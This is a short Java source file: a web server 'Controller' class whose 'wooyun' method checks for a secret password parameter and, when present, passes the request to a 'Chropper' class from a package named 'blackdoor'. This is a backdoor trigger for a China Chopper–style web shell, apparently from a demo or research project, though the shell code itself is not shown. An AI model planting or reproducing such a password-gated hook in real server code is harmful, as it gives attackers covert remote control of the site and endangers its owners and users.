package org.javaweb.server;

import org.javaweb.server.blackdoor.Chropper;

public class Controller {
	
	public String wooyun(Request request){
		String result = "error.";
		if(request.getParameterMap().containsKey(Chropper.getPassword())){
			result = new Chropper(request).request();
		}
		return result;
	}

}
